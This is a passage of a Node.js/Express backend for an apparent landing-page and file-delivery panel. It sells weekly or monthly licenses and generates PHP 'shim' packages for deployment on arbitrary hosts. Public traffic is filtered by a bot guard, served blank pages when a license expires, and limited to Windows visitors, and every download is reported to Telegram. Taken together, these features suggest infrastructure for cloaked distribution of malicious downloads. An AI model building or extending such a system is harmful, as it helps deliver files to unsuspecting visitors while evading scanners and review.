  let nextPlan = user.license_plan;
  let nextExpires = user.license_expires_at;

  if (action === 'revoke') {
    nextExpires = new Date();
  } else if (action === 'activate' || action === 'extend') {
    if (!plan || !LICENSE_DURATIONS_MS[plan]) return res.status(400).json({ error: 'Plan must be weekly or monthly' });
    const durMs = LICENSE_DURATIONS_MS[plan];
    if (action === 'activate') {
      nextExpires = new Date(Date.now() + durMs);
    } else {
      const cur = user.license_expires_at ? new Date(user.license_expires_at).getTime() : 0;
      const base = Math.max(cur, Date.now());
      nextExpires = new Date(base + durMs);
    }
    nextPlan = plan;
  } else {
    return res.status(400).json({ error: 'Action must be activate, extend, or revoke' });
  }

  await runSql('UPDATE users SET license_plan = ?, license_expires_at = ? WHERE id = ?', [nextPlan, nextExpires.toISOString(), req.params.id]);
  logActivity('License ' + action, action + ' ' + (plan || user.license_plan || '') + ' for ' + user.name, req.session.user.name);
  const fresh = await queryOne('SELECT id, role, license_plan, license_expires_at FROM users WHERE id = ?', [req.params.id]);
  res.json({ license: licenseSummary(fresh) });
});

// ═══════════ PAGES ═══════════
// Shared workspace: every authenticated user — Admin and User — sees and can mutate
// every page. The page's user_id is still recorded so visitor traffic is gated by
// that user's license at the shim/render layer.
app.get('/api/pages', requireAuth, async (req, res) => {
  const isAdmin = req.session.user.role === 'Admin';
  const userId = req.session.user.id;
  const pages = await queryAll(`
    SELECT p.*, u.name AS owner_name, u.email AS owner_email
    FROM pages p LEFT JOIN users u ON u.id = p.user_id
    ORDER BY p.created DESC
  `);
  for (const p of pages) {
    // Per-user version isolation: each user only sees the versions they uploaded.
    // Admins see everything (including legacy versions with user_id IS NULL).
    if (isAdmin) {
      p.versions = await queryAll(
        `SELECT v.*, u.name AS uploaded_by FROM versions v LEFT JOIN users u ON u.id = v.user_id WHERE v.page_id = ? ORDER BY v.date DESC`,
        [p.id]
      );
    } else {
      p.versions = await queryAll(
        `SELECT v.*, u.name AS uploaded_by FROM versions v LEFT JOIN users u ON u.id = v.user_id WHERE v.page_id = ? AND v.user_id = ? ORDER BY v.date DESC`,
        [p.id, userId]
      );
    }
  }
  res.json(pages);
});

function normalizeRedirectUrl(value) {
  if (value === undefined) return { skip: true };
  const trimmed = (value || '').trim();
  if (!trimmed) return { value: null };
  if (!/^https?:\/\//i.test(trimmed)) return { error: 'Redirect URL must start with http:// or https://' };
  return { value: trimmed };
}

app.post('/api/pages', requireAdmin, async (req, res) => {
  const { name, htmlCode, status, user_id, redirect_url } = req.body;
  if (!name) return res.status(400).json({ error: 'Page name required' });

  const ownerId = user_id ? String(user_id) : null;
  if (ownerId) {
    const owner = await queryOne('SELECT id FROM users WHERE id = ?', [ownerId]);
    if (!owner) return res.status(400).json({ error: 'Owner user not found' });
  }

  const r = normalizeRedirectUrl(redirect_url);
  if (r.error) return res.status(400).json({ error: r.error });
  const finalRedirect = r.skip ? null : r.value;

  const id = uid();
  await runSql('INSERT INTO pages (id, name, html_code, status, created, user_id, redirect_url) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [id, name, htmlCode || '', status || 'active', today(), ownerId, finalRedirect]
  );
  logActivity('Page Created', 'Created page: ' + name, req.session.user.name);
  res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), user_id: ownerId, redirect_url: finalRedirect, versions: [] });
});

app.put('/api/pages/:id', requireAdmin, async (req, res) => {
  const { name, htmlCode, status, user_id, redirect_url } = req.body;
  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });

  let ownerId = page.user_id;
  if (user_id !== undefined) {
    ownerId = user_id ? String(user_id) : null;
    if (ownerId) {
      const owner = await queryOne('SELECT id FROM users WHERE id = ?', [ownerId]);
      if (!owner) return res.status(400).json({ error: 'Owner user not found' });
    }
  }

  const r = normalizeRedirectUrl(redirect_url);
  if (r.error) return res.status(400).json({ error: r.error });
  const nextRedirect = r.skip ? page.redirect_url : r.value;

  await runSql('UPDATE pages SET name=?, html_code=?, status=?, user_id=?, redirect_url=? WHERE id=?',
    [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, ownerId, nextRedirect, req.params.id]
  );
  logActivity('Page Updated', 'Updated page: ' + (name || page.name), req.session.user.name);
  res.json({ ok: true });
});

app.delete('/api/pages/:id', requireAdmin, async (req, res) => {
  const page = await queryOne('SELECT name FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });

  const versions = await queryAll('SELECT file_path FROM versions WHERE page_id = ?', [req.params.id]);
  versions.forEach(v => {
    const fp = safeUploadPath(v.file_path);
    if (fp && fs.existsSync(fp)) fs.unlinkSync(fp);
  });

  await runSql('DELETE FROM versions WHERE page_id = ?', [req.params.id]);
  await runSql('DELETE FROM deployments WHERE page_id = ?', [req.params.id]);
  await runSql('DELETE FROM pages WHERE id = ?', [req.params.id]);
  logActivity('Page Deleted', 'Deleted page: ' + page.name, req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ VERSIONS / FILE UPLOAD (User) ═══════════
// Wrap multer so filter / size errors return a clean 400 instead of falling through to the
// default Express error handler (which would respond 500 with a stack trace).
function uploadFile(req, res, next) {
  upload.single('file')(req, res, (err) => {
    if (err) return res.status(400).json({ error: err.message || 'Upload failed' });
    next();
  });
}

// Auto-increment the version number from the latest of THIS user's existing versions
// on this page. Each user has their own version sequence.
async function nextVersionFor(pageId, userId) {
  const latest = await queryOne(
    'SELECT version FROM versions WHERE page_id = ? AND user_id = ? ORDER BY date DESC LIMIT 1',
    [pageId, userId]
  );
  if (!latest || !latest.version) return '0.0.1';
  const parts = latest.version.split('.');
  const patch = (parseInt(parts[2]) || 0) + 1;
  return (parts[0] || '0') + '.' + (parts[1] || '0') + '.' + patch;
}

app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Page not found' });
  }
  const isAdmin_ = req.session.user.role === 'Admin';
  if (!isAdmin_ && page.user_id && page.user_id !== req.session.user.id) {
    fs.unlinkSync(req.file.path);
    return res.status(403).json({ error: 'You do not own this page' });
  }
  const uid_ = req.session.user.id;
  const newVer = await nextVersionFor(req.params.id, uid_);
  await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id = ?', [req.params.id, uid_]);

  const vId = uid();
  const notes = (req.body && req.body.notes) || ('File uploaded on ' + today());
  await runSql(
    'INSERT INTO versions (id, page_id, user_id, version, file_name, file_path, original_name, link_url, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
    [vId, req.params.id, uid_, newVer, req.file.filename, req.file.filename, req.file.originalname, null, notes, today()]
  );

  logActivity('File Uploaded', 'Uploaded v' + newVer + ' for ' + page.name, req.session.user.name);
  const version_ = { version: newVer, original_name: req.file.originalname, file_name: req.file.filename, link_url: null };
  setImmediate(() => notifyUpload(page, version_, req.session.user));
  res.json({ id: vId, version: newVer, fileName: req.file.originalname, active: true });
});

app.post('/api/pages/:id/link', requireAuth, async (req, res) => {
  const { linkUrl, notes } = req.body;
  if (!linkUrl) return res.status(400).json({ error: 'Link URL is required' });
  const lower = String(linkUrl).trim().toLowerCase();
  if (!/^https?:\/\//.test(lower)) return res.status(400).json({ error: 'Link URL must start with http:// or https://' });
  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  const isAdminL_ = req.session.user.role === 'Admin';
  if (!isAdminL_ && page.user_id && page.user_id !== req.session.user.id) {
    return res.status(403).json({ error: 'You do not own this page' });
  }

  const uid_ = req.session.user.id;
  const newVer = await nextVersionFor(req.params.id, uid_);

  await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id = ?', [req.params.id, uid_]);

  const vId = uid();
  await runSql('INSERT INTO versions (id, page_id, user_id, version, file_name, file_path, original_name, link_url, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
    [vId, req.params.id, uid_, newVer, null, null, null, linkUrl, notes || 'Link added on ' + today(), today()]
  );

  logActivity('Link Added', 'Added link v' + newVer + ' for ' + page.name, req.session.user.name);
  const version_ = { version: newVer, original_name: null, file_name: null, link_url: linkUrl };
  setImmediate(() => notifyUpload(page, version_, req.session.user));
  res.json({ id: vId, version: newVer, linkUrl, active: true });
});

app.put('/api/versions/:id/activate', requireAuth, async (req, res) => {
  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
  if (!ver) return res.status(404).json({ error: 'Version not found' });
  // Per-user activation: a non-admin can ONLY activate versions they own. NULL-user
  // (orphaned / legacy) versions are admin-only — otherwise a user could "claim" an
  // orphan and have it surface on every other user's deployment via fallback.
  const isAdmin = req.session.user.role === 'Admin';
  if (!isAdmin && ver.user_id !== req.session.user.id) {
    return res.status(403).json({ error: 'You do not own this version' });
  }
  // Deactivate only versions in the same (page, user_id) bucket as this version, so
  // other users' active versions are untouched.
  const ownerId = ver.user_id;
  if (ownerId == null) {
    await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id IS NULL', [ver.page_id]);
  } else {
    await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id = ?', [ver.page_id, ownerId]);
  }
  await runSql('UPDATE versions SET active = 1 WHERE id = ?', [req.params.id]);
  res.json({ ok: true });
});

app.delete('/api/versions/:id', requireAuth, async (req, res) => {
  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
  if (!ver) return res.status(404).json({ error: 'Version not found' });
  const isAdmin = req.session.user.role === 'Admin';
  if (!isAdmin && ver.user_id !== req.session.user.id) {
    return res.status(403).json({ error: 'You do not own this version' });
  }

  // Only count versions in the same (page, user) bucket toward the "cannot delete only version" rule.
  const ownerCondSql = ver.user_id == null ? 'user_id IS NULL' : 'user_id = ?';
  const ownerCondParams = ver.user_id == null ? [ver.page_id] : [ver.page_id, ver.user_id];
  const rows = await queryAll(`SELECT id FROM versions WHERE page_id = ? AND ${ownerCondSql}`, ownerCondParams);
  if (rows.length <= 1) return res.status(400).json({ error: 'Cannot delete the only version' });

  const fp = safeUploadPath(ver.file_path);
  if (fp && fs.existsSync(fp)) fs.unlinkSync(fp);

  const wasActive = ver.active;
  await runSql('DELETE FROM versions WHERE id = ?', [req.params.id]);

  if (wasActive) {
    const next = await queryOne(
      `SELECT id FROM versions WHERE page_id = ? AND ${ownerCondSql} ORDER BY date DESC LIMIT 1`,
      ownerCondParams
    );
    if (next) await runSql('UPDATE versions SET active = 1 WHERE id = ?', [next.id]);
  }

  res.json({ ok: true });
});

// ═══════════ DNS CONFIG ═══════════
app.get('/api/dns-config', requireAuth, async (req, res) => {
  let serverIp = process.env.SERVER_IP || '';
  let serverHostname = process.env.SERVER_HOSTNAME || '';
  // Fallback to settings table
  if (!serverIp) {
    const row = await queryOne("SELECT value FROM settings WHERE key = 'server_ip'");
    if (row) serverIp = row.value;
  }
  if (!serverHostname) {
    const row = await queryOne("SELECT value FROM settings WHERE key = 'server_hostname'");
    if (row) serverHostname = row.value;
  }
  // Auto-detect: resolve hostname to IP so users always get a simple A record
  if (!serverIp && !serverHostname) {
    const host = req.hostname;
    if (host && host !== 'localhost' && host !== '127.0.0.1') {
      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) {
        serverIp = host;
      } else {
        // Resolve hostname to IP for simpler A record setup
        try {
          const ips = await dns.resolve4(host);
          if (ips.length > 0) serverIp = ips[0];
          else serverHostname = host;
        } catch (e) {
          serverHostname = host;
        }
      }
    }
  }
  const dnsType = serverIp ? 'A' : (serverHostname ? 'CNAME' : 'A');
  const dnsValue = serverIp || serverHostname || '';
  res.json({ serverIp, serverHostname, dnsType, dnsValue });
});

// ═══════════ DOMAINS (User) ═══════════
app.get('/api/domains', requireAuth, async (req, res) => {
  const domains = await queryAll('SELECT * FROM domains WHERE user_id = ? ORDER BY created DESC', [req.session.user.id]);
  res.json(domains);
});

app.post('/api/domains', requireAuth, async (req, res) => {
  const { domain, pageId, autoSSL, notes } = req.body;
  if (!domain) return res.status(400).json({ error: 'Domain name required' });

  // Auto-fill DNS config from server settings
  let serverIp = process.env.SERVER_IP || '';
  let serverHostname = process.env.SERVER_HOSTNAME || '';
  if (!serverIp) { const r = await queryOne("SELECT value FROM settings WHERE key = 'server_ip'"); if (r) serverIp = r.value; }
  if (!serverHostname) { const r = await queryOne("SELECT value FROM settings WHERE key = 'server_hostname'"); if (r) serverHostname = r.value; }
  if (!serverIp && !serverHostname) {
    const host = req.hostname;
    if (host && host !== 'localhost' && host !== '127.0.0.1') {
      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) {
        serverIp = host;
      } else {
        try { const ips = await dns.resolve4(host); if (ips.length > 0) serverIp = ips[0]; else serverHostname = host; } catch (e) { serverHostname = host; }
      }
    }
  }
  const dnsType = serverIp ? 'A' : (serverHostname ? 'CNAME' : 'A');
  const dnsValue = serverIp || serverHostname || '';

  const id = uid();
  await runSql('INSERT INTO domains (id, user_id, domain, page_id, dns_type, dns_value, auto_ssl, ssl_active, dns_verified, notes, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, ?, ?)',
    [id, req.session.user.id, domain, pageId || null, dnsType, dnsValue, autoSSL !== false ? 1 : 0, notes || '', today()]
  );
  logActivity('Domain Added', 'Added domain: ' + domain, req.session.user.name);
  res.json({ id, domain, page_id: pageId, dns_type: dnsType, dns_value: dnsValue, auto_ssl: autoSSL !== false ? 1 : 0, ssl_active: 0, dns_verified: 0, notes: notes || '', created: today() });
});

app.put('/api/domains/:id', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  const { domain, pageId, dnsType, dnsValue, autoSSL, notes } = req.body;
  await runSql('UPDATE domains SET domain=?, page_id=?, dns_type=?, dns_value=?, auto_ssl=?, notes=? WHERE id=?',
    [domain || dom.domain, pageId !== undefined ? pageId : dom.page_id, dnsType || dom.dns_type,
     dnsValue !== undefined ? dnsValue : dom.dns_value, autoSSL !== undefined ? (autoSSL ? 1 : 0) : dom.auto_ssl,
     notes !== undefined ? notes : dom.notes, req.params.id]
  );
  res.json({ ok: true });
});

app.delete('/api/domains/:id', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT domain FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  await runSql('DELETE FROM domains WHERE id = ?', [req.params.id]);
  logActivity('Domain Deleted', 'Deleted domain: ' + dom.domain, req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ SHIM DEPLOYMENT PACKAGE ═══════════
// Deployments are tied to a landing page id. The downloaded index.php embeds the page
// id and a per-page secret; the user drops it on any host (domain or raw IP, doesn't matter).
const shimPhpTemplate = fs.readFileSync(path.join(__dirname, 'templates', 'shim', 'index.php'), 'utf8');
const shimHtaccess = fs.readFileSync(path.join(__dirname, 'templates', 'shim', '.htaccess'), 'utf8');

function buildShimPhp({ centralUrl, pageId, shimSecret }) {
  return shimPhpTemplate
    .replace('{{CENTRAL_URL}}',  centralUrl.replace(/'/g, "\\'"))
    .replace('{{SHIM_PAGE_ID}}', pageId.replace(/'/g, "\\'"))
    .replace('{{SHIM_SECRET}}',  shimSecret.replace(/'/g, "\\'"));
}

async function ensurePageShimSecret(page) {
  if (page.shim_secret) return page.shim_secret;
  const secret = crypto.randomBytes(32).toString('hex');
  await runSql('UPDATE pages SET shim_secret = ? WHERE id = ?', [secret, page.id]);
  return secret;
}

// Returns the existing per-(page, user) deployment row's secret, or creates one.
async function ensureDeployment(pageId, userId) {
  const existing = await queryOne('SELECT * FROM deployments WHERE page_id = ? AND user_id = ?', [pageId, userId]);
  if (existing) return existing;
  const id = uid();
  const secret = crypto.randomBytes(32).toString('hex');
  await runSql('INSERT INTO deployments (id, page_id, user_id, shim_secret, created) VALUES (?, ?, ?, ?, ?)',
    [id, pageId, userId, secret, today()]);
  return { id, page_id: pageId, user_id: userId, shim_secret: secret, created: today() };
}

function centralBaseUrl(req) {
  if (process.env.PUBLIC_URL) return process.env.PUBLIC_URL;
  const proto = req.headers['x-forwarded-proto'] || (req.secure ? 'https' : 'http');
  return proto + '://' + req.headers.host;
}

// Minimal store-format ZIP builder (no compression). Avoids adding a dependency.
function buildZip(files) {
  const now = new Date();
  const dosTime = (now.getHours() << 11) | (now.getMinutes() << 5) | Math.floor(now.getSeconds() / 2);
  const dosDate = ((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate();
  const parts = [];
  const central = [];
  let offset = 0;

  for (const f of files) {
    const nameBuf = Buffer.from(f.name, 'utf8');
    const data = Buffer.isBuffer(f.content) ? f.content : Buffer.from(f.content, 'utf8');
    const crc = zlib.crc32(data);
    const size = data.length;

    const lfh = Buffer.alloc(30);
    lfh.writeUInt32LE(0x04034b50, 0);
    lfh.writeUInt16LE(20, 4);
    lfh.writeUInt16LE(0, 6);
    lfh.writeUInt16LE(0, 8);
    lfh.writeUInt16LE(dosTime, 10);
    lfh.writeUInt16LE(dosDate, 12);
    lfh.writeUInt32LE(crc, 14);
    lfh.writeUInt32LE(size, 18);
    lfh.writeUInt32LE(size, 22);
    lfh.writeUInt16LE(nameBuf.length, 26);
    lfh.writeUInt16LE(0, 28);
    parts.push(lfh, nameBuf, data);

    const cdh = Buffer.alloc(46);
    cdh.writeUInt32LE(0x02014b50, 0);
    cdh.writeUInt16LE(0x031e, 4);
    cdh.writeUInt16LE(20, 6);
    cdh.writeUInt16LE(0, 8);
    cdh.writeUInt16LE(0, 10);
    cdh.writeUInt16LE(dosTime, 12);
    cdh.writeUInt16LE(dosDate, 14);
    cdh.writeUInt32LE(crc, 16);
    cdh.writeUInt32LE(size, 20);
    cdh.writeUInt32LE(size, 24);
    cdh.writeUInt16LE(nameBuf.length, 28);
    cdh.writeUInt16LE(0, 30);
    cdh.writeUInt16LE(0, 32);
    cdh.writeUInt16LE(0, 34);
    cdh.writeUInt16LE(0, 36);
    cdh.writeUInt32LE(0, 38);
    cdh.writeUInt32LE(offset, 42);
    central.push(cdh, nameBuf);

    offset += lfh.length + nameBuf.length + data.length;
  }

  const cdSize = central.reduce((s, b) => s + b.length, 0);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...parts, ...central, eocd]);
}

// Each user gets their own deployment row for a page. Downloading the zip creates one
// (or fetches the existing one) so the same user always gets the same secret on repeat
// downloads — re-uploading the shim on cPanel doesn't break previously-deployed copies
// of the same user.
app.get('/api/pages/:id/shim-zip', requireAuth, async (req, res) => {
  const page = await queryOne('SELECT id, name FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  const deployment = await ensureDeployment(page.id, req.session.user.id);
  const php = buildShimPhp({ centralUrl: centralBaseUrl(req), pageId: page.id, shimSecret: deployment.shim_secret });
  const zip = buildZip([
    { name: 'index.php', content: php },
    { name: '.htaccess', content: shimHtaccess },
  ]);
  const filename = crypto.randomBytes(8).toString('hex') + '.zip';
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', 'attachment; filename="' + filename + '"');
  res.send(zip);
});

app.get('/api/pages/:id/shim-package', requireAuth, async (req, res) => {
  const page = await queryOne('SELECT id, name FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  const deployment = await ensureDeployment(page.id, req.session.user.id);
  const php = buildShimPhp({ centralUrl: centralBaseUrl(req), pageId: page.id, shimSecret: deployment.shim_secret });
  res.setHeader('Content-Type', 'application/x-httpd-php');
  res.setHeader('Content-Disposition', 'attachment; filename="index.php"');
  res.send(php);
});

app.get('/api/pages/:id/shim-htaccess', requireAuth, async (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename=".htaccess"');
  res.send(shimHtaccess);
});

// Rotates THIS user's deployment secret for THIS page. Other users' deployments and
// the legacy page-wide shim_secret are untouched.
app.post('/api/pages/:id/rotate-shim-secret', requireAuth, async (req, res) => {
  const page = await queryOne('SELECT id, name FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  const deployment = await ensureDeployment(page.id, req.session.user.id);
  const secret = crypto.randomBytes(32).toString('hex');
  await runSql('UPDATE deployments SET shim_secret = ? WHERE id = ?', [secret, deployment.id]);
  logActivity('Shim Secret Rotated', 'Rotated own deployment secret for page: ' + page.name, req.session.user.name);
  res.json({ ok: true });
});

// Returns the calling user's deployment fingerprint for this page — a short, safe id
// derived from their own deployment secret so the user can visually confirm "this
// zip is mine". Also reports whether the user has an active version (visitors hitting
// their shim will get a 404 on download if not). Auto-creates the deployment so the
// fingerprint matches what would be baked into the next shim-zip download.
app.get('/api/pages/:id/my-deployment', requireAuth, async (req, res) => {
  const page = await queryOne('SELECT id, name, user_id FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  const dep = await ensureDeployment(page.id, req.session.user.id);
  const active = await queryOne('SELECT id, version FROM versions WHERE page_id = ? AND user_id = ? AND active = 1 LIMIT 1',
    [page.id, req.session.user.id]);
  // Fingerprint is the first 6 chars of a SHA-256 of the secret — short, unique per
  // deployment, and reveals nothing about the secret itself.
  const fingerprint = crypto.createHash('sha256').update(dep.shim_secret).digest('hex').slice(0, 6).toUpperCase();
  res.json({
    deployment_id: dep.id,
    fingerprint,
    has_active_version: !!active,
    active_version: active ? active.version : null,
    user_name: req.session.user.name,
  });
});

app.post('/api/domains/:id/verify-dns', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  const expected = dom.dns_value;
  if (!expected) return res.status(400).json({ error: 'No DNS target configured. Set SERVER_IP or SERVER_HOSTNAME in settings.' });

  try {
    let verified = false;
    let currentResults = [];

    // Try CNAME lookup first
    try {
      const cnames = await dns.resolveCname(dom.domain);
      currentResults.push(...cnames.map(c => 'CNAME: ' + c));
      // Check exact match or match without trailing dot
      verified = cnames.some(c => c === expected || c === expected + '.' || c.replace(/\.$/, '') === expected);
    } catch (e) { /* no CNAME record, try A */ }

    // Try A record lookup
    if (!verified) {
      try {
        const ips = await dns.resolve4(dom.domain);
        currentResults.push(...ips.map(ip => 'A: ' + ip));
        // If expected is a hostname, resolve it to IP and compare
        if (!verified && !/^\d{1,3}(\.\d{1,3}){3}$/.test(expected)) {
          try {
            const expectedIps = await dns.resolve4(expected);
            verified = ips.some(ip => expectedIps.includes(ip));
          } catch (e) { /* couldn't resolve expected hostname */ }
        } else {
          verified = ips.includes(expected);
        }
      } catch (e) { /* no A record either */ }
    }

    if (verified) {
      await runSql('UPDATE domains SET dns_verified = 1 WHERE id = ?', [req.params.id]);
    }
    res.json({ verified, current: currentResults.join(', ') || 'No DNS records found', expected });
  } catch (err) {
    res.json({ verified: false, current: 'DNS lookup failed: ' + (err.code || err.message), expected });
  }
});

app.post('/api/domains/:id/ssl', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  if (!dom.dns_verified) return res.status(400).json({ error: 'DNS must be verified before installing SSL. Please verify DNS propagation first.' });

  const { action } = req.body;
  if (action === 'generate' || action === 'renew') {
    await runSql('UPDATE domains SET ssl_active = 1, ssl_date = ? WHERE id = ?', [today(), req.params.id]);
    logActivity('SSL ' + (action === 'generate' ? 'Generated' : 'Renewed'), dom.domain, req.session.user.name);
  }
  res.json({ ok: true });
});

// ═══════════ LINKS (User) ═══════════
app.get('/api/links', requireAuth, async (req, res) => {
  const links = await queryAll(
    'SELECT d.*, p.name as page_name FROM domains d LEFT JOIN pages p ON d.page_id = p.id WHERE d.user_id = ? ORDER BY d.created DESC',
    [req.session.user.id]
  );
  const results = links.map(d => {
    let status = 'no_page';
    let link = '';
    if (d.page_id && d.page_name) {
      const protocol = d.ssl_active ? 'https' : 'http';
      status = d.ssl_active ? 'ready' : 'http_only';
      link = protocol + '://' + d.domain + '/page/' + d.page_id;
    }
    return {
      id: d.id,
      domain: d.domain,
      page_id: d.page_id,
      page_name: d.page_name || null,
      link: link,
      status: status,
      ssl_active: !!d.ssl_active,
      created: d.created
    };
  });
  res.json(results);
});

// ═══════════ ACTIVITY & SETTINGS (Admin) ═══════════
app.get('/api/activity', requireAdmin, async (req, res) => {
  const items = await queryAll('SELECT * FROM activity ORDER BY id DESC LIMIT 50');
  res.json(items);
});

app.get('/api/settings', requireAdmin, async (req, res) => {
  const rows = await queryAll('SELECT * FROM settings');
  const obj = {};
  rows.forEach(r => { obj[r.key] = r.value; });
  res.json(obj);
});

app.put('/api/settings', requireAdmin, async (req, res) => {
  for (const [k, v] of Object.entries(req.body)) {
    const existing = await queryOne('SELECT key FROM settings WHERE key = ?', [k]);
    if (existing) {
      await runSql('UPDATE settings SET value = ? WHERE key = ?', [v, k]);
    } else {
      await runSql('INSERT INTO settings (key, value) VALUES (?, ?)', [k, v]);
    }
  }
  res.json({ ok: true });
});

app.post('/api/settings/telegram-test', requireAdmin, async (req, res) => {
  const t = await queryOne("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
  const c = await queryOne("SELECT value FROM settings WHERE key = 'telegram_chat_id'");
  if (!t || !t.value || !c || !c.value) return res.status(400).json({ error: 'Bot token and chat ID must be saved first' });
  const r = await sendTelegram(t.value, c.value,
    '✅ <b>Test alert (global)</b>\nThe global Telegram channel is connected. Every download across the whole system is mirrored here. If a page owner has also set up their own Telegram, they receive a copy too.\n<b>Time:</b> ' + new Date().toISOString());
  if (!r.ok) return res.status(502).json({ error: 'Telegram rejected: ' + r.err });
  res.json({ ok: true });
});

// ═══════════ STATS ═══════════
app.get('/api/stats', requireAuth, async (req, res) => {
  const user = req.session.user;
  if (user.role === 'Admin') {
    const pages = await queryOne('SELECT COUNT(*) as c FROM pages');
    const users = await queryOne('SELECT COUNT(*) as c FROM users');
    const versions = await queryOne('SELECT COUNT(*) as c FROM versions');
    const deployments = await queryOne('SELECT COUNT(*) as c FROM pages WHERE shim_secret IS NOT NULL');
    res.json({ pages: pages.c, users: users.c, versions: versions.c, deployments: deployments.c });
  } else {
    const pages = await queryOne('SELECT COUNT(*) as c FROM pages');
    const versions = await queryOne('SELECT COUNT(*) as c FROM versions');
    const deployments = await queryOne('SELECT COUNT(*) as c FROM pages WHERE shim_secret IS NOT NULL');
    res.json({ pages: pages.c, versions: versions.c, deployments: deployments.c });
  }
});

// ═══════════ PUBLIC PAGE RENDERING ═══════════
// Admin preview helper — renders the page exactly as a verified Windows visitor would see it,
// skipping botGuard / Windows-only / licensing gates. Triggered when the request carries an
// authenticated Admin session, OR when query ?preview=1 is paired with a valid admin session.
function isAdminSession(req) { return !!(req.session && req.session.user && req.session.user.role === 'Admin'); }
// Any logged-in dashboard user (Admin or User) — used to bypass bot guard / Windows gate
// / license check on the in-dashboard preview so users can review their pages before
// deploying to a host.
function isAuthenticatedSession(req) { return !!(req.session && req.session.user); }

app.get('/page/:id', async (req, res, next) => {
  // Dashboard preview: any logged-in user (Admin or User) bypasses visitor-facing gates
  // so they can review the page before deploying. Anonymous traffic still runs the full pipeline.
  if (isAuthenticatedSession(req)) {
    const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
    if (!page || !page.html_code) {
      return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#fff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1>Page Not Found</h1><p style="color:#6b7280;">This landing page does not exist.</p></div></body></html>');
    }
    return renderPage(page, res, req);
  }
  // Public visitor flow: full bot + Windows + license pipeline.
  return botGuard(req, res, async () => {
    const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
    if (!page || !page.html_code) {
      return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#1a1a1a;">Page Not Found</h1><p style="color:#6b7280;">This landing page does not exist.</p></div></body></html>');
    }
    if (!(await pageOwnerIsLicensed(page))) return res.status(200).send(BLANK_HTML);
    if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
    await renderPage(page, res, req);
  });
});

async function downloadHandler(req, res) {
  // Licensing: refuse if the page's owner license has expired. Any logged-in dashboard
  // user is exempt so previews work; only anonymous visitor traffic enforces the gate.
  if (!isAuthenticatedSession(req)) {
    const owningPage = await queryOne('SELECT user_id FROM pages WHERE id = ?', [req.params.pageId]);
    if (!(await pageOwnerIsLicensed(owningPage))) return res.status(404).json({ error: 'Not available' });
  }

  const activeVersion = await findActiveVersion(req.params.pageId, effectiveUserForRequest(req));
  if (!activeVersion) return res.status(404).json({ error: 'No active version' });

